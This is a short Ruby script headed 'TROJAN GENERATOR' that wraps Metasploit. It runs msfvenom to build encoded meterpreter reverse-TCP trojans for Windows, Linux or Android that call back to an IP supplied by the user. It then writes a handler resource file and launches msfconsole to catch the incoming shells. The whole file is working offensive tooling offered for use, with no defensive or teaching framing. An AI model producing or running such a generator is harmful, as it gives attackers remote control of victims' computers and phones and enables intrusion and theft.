#!/usr/bin/env ruby
#
# PASS IN YOUR IP ADDRESS AS THE ARGUMENT TO THE SCRIPT. You IP address will be set to home in the trojan virus. After creating the virus, a reverse TCP handler starts.
# @author Chris Basinger<evilthreads669966@gmail.com>
# TROJAN GENERATOR
#
# set the IP address to the first script argument
ip = ARGV[0]

#exit if metasploit is not installed
response = system('which msfconsole')
if !response
  puts 'Metasploit is not installed.'
  exit! 1
end

puts "TROJAN GENERATOR"
puts "Enter WINDOWS | ANDROID | LINUX"

# Get the platform type
selection = STDIN.gets.chomp.upcase

# name pointer
fileName = nil

# run msfvenom to generate the virus file.
case selection
when "LINUX"
  fileName = "trojan.elf"
  IO.popen "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=#{ip} -e x86/shikata_ga_nai -i 5 -f elf -o #{fileName}" do |io|
    puts io.gets
  end
when "WINDOWS"
  fileName = "trojan.exe"
  IO.popen "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=#{ip} -e x86/shikata_ga_nai -i 5 -f exe -o #{fileName}" do |io|
    puts io.gets
  end
when "ANDROID"
  fileName = "trojan.apk"
  IO.popen "msfvenom -p android/meterpreter/reverse_tcp LHOST=#{ip} -e x86/shikata_ga_nai -i 5 -f raw -o #{fileName}" do |io|
    puts io.gets
  end
else
  # exit if the user entered an invalid selection
  puts "Invalid selection"
  exit! 1
end

puts "TROJAN HAS BEEN GENERATED #{fileName}"
puts "STARTING METERPRETER"

# Create file and write commands to it for msfconsole
file = File.new("commands.rc", 'w')
file.puts "use exploit/multi/handler"
case selection
when "LINUX"
  file.puts "set payload linux/x86/meterpreter/reverse_tcp"
when "WINDOWS"
  file.puts "set payload windows/x64/meterpreter/reverse_tcp"
when "ANDROID"
  file.puts "set payload android/meterpreter/reverse_tcp"
end
file.puts "set LHOST #{ip}"
file.puts "exploit"
file.close

# run MSFCONSOlE with the created file as an argument
exec("msfconsole -r #{Dir.pwd}/commands.rc")
